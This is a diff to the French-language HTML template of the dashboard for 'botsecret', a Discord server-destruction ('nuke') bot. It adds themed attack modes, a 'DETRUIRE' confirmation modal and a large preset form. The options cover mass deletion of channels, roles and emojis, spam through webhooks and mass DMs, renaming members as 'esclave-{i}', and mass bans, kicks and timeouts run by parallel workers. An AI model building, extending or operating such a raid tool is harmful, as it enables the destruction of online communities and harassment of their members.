@@ -1,9 +1,13 @@
 {% extends "base.html" %}
 {% block title %}Dashboard — botsecret{% endblock %}
 {% block body %}
+<canvas id="embers"></canvas>
+<div class="scanlines"></div>
+
 <header class="topbar">
-  <div>
-    <h1>botsecret</h1>
+  <div class="brand">
+    <h1 class="glitch" data-text="BOTSECRET">BOTSECRET</h1>
+    <p class="muted sigil">☠ invocation de destruction ☠</p>
     <p class="muted" id="bot-line">état du bot…</p>
   </div>
   <div class="topbar-actions">
@@ -12,9 +16,48 @@
   </div>
 </header>
 
+<section class="card altar">
+  <div class="altar-head">
+    <h2>⛧ Zone démoniaque ⛧</h2>
+    <span class="hint">Ctrl + Shift + D</span>
+  </div>
+  <p class="muted">Choisis un rituel. Chaque mode surcharge le preset personnalisé.</p>
+  <div class="modes">
+    {% for mode in modes %}
+    <button class="mode" data-mode="{{ mode.key }}" data-label="{{ mode.label }}">
+      <span class="mode-emoji">{{ mode.emoji }}</span>
+      <span class="mode-label">{{ mode.label }}</span>
+      <span class="mode-tag">{{ mode.tagline }}</span>
+      <span class="mode-go">FRAPPER</span>
+    </button>
+    {% endfor %}
+    <button class="mode mode-custom" data-mode="custom" data-label="Personnalisé">
+      <span class="mode-emoji">⚙️</span>
+      <span class="mode-label">Personnalisé</span>
+      <span class="mode-tag">Ton preset, tes réglages, zéro pitié.</span>
+      <span class="mode-go">FRAPPER</span>
+    </button>
+  </div>
+  <p class="muted" id="mode-note"></p>
+</section>
+
+<section class="card danger-card">
+  <div class="row between">
+    <h2>💀 Exécution</h2>
+    <span class="muted" id="mode-running"></span>
+  </div>
+  <div class="progress"><div class="progress-bar" id="progress-bar"></div></div>
+  <p class="muted" id="progress-text">au repos — rien ne brûle encore</p>
+  <div class="row">
+    <button class="btn btn-danger" id="destroy">☠️ DÉCLENCHER</button>
+    <button class="btn btn-ghost" id="stop">⏹️ Interrompre</button>
+  </div>
+  <p class="counters" id="counters"></p>
+</section>
+
 <section class="card">
-  <h2>Code secret</h2>
-  <p class="muted">Sans ce code, <code>/gerer</code>, <code>/welcome</code> et <code>/stats</code> restent muets.</p>
+  <h2>🔑 Code secret</h2>
+  <p class="muted">Sans ce code, <code>/gerer</code>, <code>/welcome</code>, <code>/salut</code>, <code>/regles</code>, <code>/info</code>, <code>/ping</code>, <code>/stats</code> et <code>/aide</code> restent muets.</p>
   <div class="row">
     <input type="text" id="secret-code" value="{{ secret_code }}" spellcheck="false">
     <button class="btn" id="save-secret">Enregistrer</button>
@@ -23,7 +66,7 @@
 </section>
 
 <section class="card">
-  <h2>Serveur cible</h2>
+  <h2>🎯 Serveur cible</h2>
   <div class="row">
     <input type="text" id="guild-id" value="{{ guild_id }}" placeholder="identifiant de la guilde" inputmode="numeric">
     <button class="btn" id="save-guild">Définir</button>
@@ -33,55 +76,84 @@
 </section>
 
 <section class="card">
-  <h2>Preset de destruction</h2>
+  <h2>⚙️ Preset personnalisé</h2>
   <form id="preset-form">
     <div class="grid">
       <div class="field">
+        <h3>Identité</h3>
         <label><input type="checkbox" data-key="rename_server" {% if preset.rename_server %}checked{% endif %}> Renommer le serveur</label>
         <input type="text" data-key="server_name" value="{{ preset.server_name }}" placeholder="nouveau nom du serveur">
+        <label><input type="checkbox" data-key="announce" {% if preset.announce %}checked{% endif %}> Annoncer dans le salon système</label>
+        <label><input type="checkbox" data-key="lockdown" {% if preset.lockdown %}checked{% endif %}> Confiner les salons (@everyone muet)</label>
       </div>
       <div class="field">
-        <label><input type="checkbox" data-key="announce" {% if preset.announce %}checked{% endif %}> Annoncer dans le salon système</label>
+        <h3>Bruit</h3>
         <label><input type="checkbox" data-key="spam" {% if preset.spam %}checked{% endif %}> Spammer un message</label>
         <input type="number" data-key="spam_count" value="{{ preset.spam_count }}" min="0" max="200">
         <input type="text" data-key="spam_message" value="{{ preset.spam_message }}" placeholder="message spam">
       </div>
       <div class="field">
+        <h3>Salons</h3>
         <label><input type="checkbox" data-key="rename_channels" {% if preset.rename_channels %}checked{% endif %}> Renommer tous les salons</label>
         <input type="text" data-key="rename_pattern" value="{{ preset.rename_pattern }}" placeholder="motif, ex: 💀-{name}">
-      </div>
-      <div class="field">
         <label><input type="checkbox" data-key="create_channels" {% if preset.create_channels %}checked{% endif %}> Créer des salons textuels</label>
         <input type="number" data-key="create_count" value="{{ preset.create_count }}" min="0" max="200">
         <input type="text" data-key="create_pattern" value="{{ preset.create_pattern }}" placeholder="motif, ex: salon-{i}">
-      </div>
-      <div class="field">
-        <label><input type="checkbox" data-key="create_voice" {% if preset.create_voice %}checked{% endif %}> Créer des salons vocaux</label>
-        <input type="number" data-key="create_voice_count" value="{{ preset.create_voice_count }}" min="0" max="50">
-        <input type="text" data-key="create_voice_pattern" value="{{ preset.create_voice_pattern }}" placeholder="motif, ex: vocal-{i}">
-      </div>
-      <div class="field">
         <label><input type="checkbox" data-key="delete_channels" {% if preset.delete_channels %}checked{% endif %}> Supprimer les anciens salons</label>
         <label><input type="checkbox" data-key="keep_channel" {% if preset.keep_channel %}checked{% endif %}> En conserver un</label>
+        <label><input type="checkbox" data-key="delete_categories" {% if preset.delete_categories %}checked{% endif %}> Supprimer les catégories</label>
       </div>
       <div class="field">
+        <h3>Vocaux &amp; fils</h3>
+        <label><input type="checkbox" data-key="create_voice" {% if preset.create_voice %}checked{% endif %}> Créer des vocaux</label>
+        <input type="number" data-key="create_voice_count" value="{{ preset.create_voice_count }}" min="0" max="50">
+        <input type="text" data-key="create_voice_pattern" value="{{ preset.create_voice_pattern }}" placeholder="motif, ex: vocal-{i}">
+        <label><input type="checkbox" data-key="create_threads" {% if preset.create_threads %}checked{% endif %}> Créer des fils</label>
+        <input type="number" data-key="create_threads_count" value="{{ preset.create_threads_count }}" min="0" max="100">
+        <input type="text" data-key="create_threads_pattern" value="{{ preset.create_threads_pattern }}" placeholder="motif, ex: fil-{i}">
+      </div>
+      <div class="field">
+        <h3>Rôles</h3>
+        <label><input type="checkbox" data-key="rename_roles" {% if preset.rename_roles %}checked{% endif %}> Renommer les rôles</label>
+        <input type="text" data-key="rename_roles_pattern" value="{{ preset.rename_roles_pattern }}" placeholder="motif, ex: 💀 {name}">
         <label><input type="checkbox" data-key="delete_roles" {% if preset.delete_roles %}checked{% endif %}> Supprimer les rôles</label>
         <label><input type="checkbox" data-key="create_roles" {% if preset.create_roles %}checked{% endif %}> Créer des rôles</label>
         <input type="number" data-key="create_roles_count" value="{{ preset.create_roles_count }}" min="0" max="50">
         <input type="text" data-key="create_roles_pattern" value="{{ preset.create_roles_pattern }}" placeholder="motif, ex: role-{i}">
       </div>
       <div class="field">
+        <h3>Déchets</h3>
         <label><input type="checkbox" data-key="delete_emojis" {% if preset.delete_emojis %}checked{% endif %}> Supprimer les emojis</label>
         <label><input type="checkbox" data-key="delete_stickers" {% if preset.delete_stickers %}checked{% endif %}> Supprimer les stickers</label>
         <label><input type="checkbox" data-key="delete_invites" {% if preset.delete_invites %}checked{% endif %}> Supprimer les invitations</label>
         <label><input type="checkbox" data-key="delete_webhooks" {% if preset.delete_webhooks %}checked{% endif %}> Supprimer les webhooks</label>
       </div>
       <div class="field">
-        <label><input type="checkbox" data-key="ban_members" {% if preset.ban_members %}checked{% endif %}> Bannir les membres</label>
-        <label><input type="checkbox" data-key="kick_members" {% if preset.kick_members %}checked{% endif %}> Expulser les membres</label>
+        <h3>Webhooks &amp; invitations</h3>
+        <label><input type="checkbox" data-key="webhook_spam" {% if preset.webhook_spam %}checked{% endif %}> Spammer via webhooks</label>
+        <input type="number" data-key="webhook_spam_count" value="{{ preset.webhook_spam_count }}" min="0" max="20">
+        <input type="text" data-key="webhook_spam_message" value="{{ preset.webhook_spam_message }}" placeholder="message webhook">
+        <label><input type="checkbox" data-key="invite_spam" {% if preset.invite_spam %}checked{% endif %}> Générer des invitations</label>
+        <input type="number" data-key="invite_spam_count" value="{{ preset.invite_spam_count }}" min="0" max="20">
+      </div>
+      <div class="field">
+        <h3>Humains</h3>
+        <label><input type="checkbox" data-key="rename_members" {% if preset.rename_members %}checked{% endif %}> Renommer les membres</label>
+        <input type="text" data-key="rename_members_pattern" value="{{ preset.rename_members_pattern }}" placeholder="motif, ex: esclave-{i}">
+        <label><input type="checkbox" data-key="timeout_members" {% if preset.timeout_members %}checked{% endif %}> Museler les membres</label>
+        <input type="number" data-key="timeout_minutes" value="{{ preset.timeout_minutes }}" min="1" max="10080">
+        <label><input type="checkbox" data-key="voice_kick" {% if preset.voice_kick %}checked{% endif %}> Déconnecter des vocaux</label>
+        <label><input type="checkbox" data-key="mass_dm" {% if preset.mass_dm %}checked{% endif %}> MP de masse</label>
+        <input type="text" data-key="mass_dm_message" value="{{ preset.mass_dm_message }}" placeholder="message privé">
+        <label><input type="checkbox" data-key="ban_members" {% if preset.ban_members %}checked{% endif %}> Bannir</label>
+        <label><input type="checkbox" data-key="kick_members" {% if preset.kick_members %}checked{% endif %}> Expulser</label>
         <label><input type="checkbox" data-key="exclude_bots" {% if preset.exclude_bots %}checked{% endif %}> Ignorer les bots</label>
       </div>
       <div class="field">
+        <h3>Dernier souffle</h3>
+        <label><input type="checkbox" data-key="final_message" {% if preset.final_message %}checked{% endif %}> Message final</label>
+        <input type="text" data-key="final_message_text" value="{{ preset.final_message_text }}" placeholder="message final">
+        <h3>Rythme</h3>
         <label>Workers parallèles</label>
         <input type="number" data-key="workers" value="{{ preset.workers }}" min="1" max="16">
         <label>Délai entre actions (ms)</label>
@@ -90,28 +162,31 @@
     </div>
     <div class="row end">
       <span class="muted" id="preset-status"></span>
-      <button type="submit" class="btn">Enregistrer le preset</button>
+      <button type="submit" class="btn">Graver le preset</button>
     </div>
   </form>
 </section>
 
-<section class="card danger-card">
-  <h2>Destruction</h2>
-  <div class="progress"><div class="progress-bar" id="progress-bar"></div></div>
-  <p class="muted" id="progress-text">au repos</p>
-  <div class="row">
-    <button class="btn btn-danger" id="destroy">💀 Détruire le serveur</button>
-    <button class="btn btn-ghost" id="stop">⏹️ Arrêter</button>
-  </div>
-  <p class="muted" id="counters"></p>
-</section>
-
 <section class="card">
   <div class="row between">
-    <h2>Journal</h2>
+    <h2>📜 Journal</h2>
     <button class="btn btn-ghost" id="clear-logs">Vider</button>
   </div>
   <pre class="console" id="console"></pre>
 </section>
+
+<div class="modal" id="modal" hidden>
+  <div class="modal-box">
+    <h2 id="modal-title">Confirmer</h2>
+    <p class="muted">Tape <strong>DETRUIRE</strong> pour sceller le rituel.</p>
+    <input type="text" id="modal-input" placeholder="DETRUIRE" autocomplete="off" spellcheck="false">
+    <div class="row end">
+      <button class="btn btn-ghost" id="modal-cancel">Renoncer</button>
+      <button class="btn btn-danger" id="modal-confirm" disabled>☠️ FRAPPER</button>
+    </div>
+  </div>
+</div>
+
+<div class="toasts" id="toasts"></div>
 {% endblock %}
 {% block scripts %}<script src="/static/app.js"></script>{% endblock %}
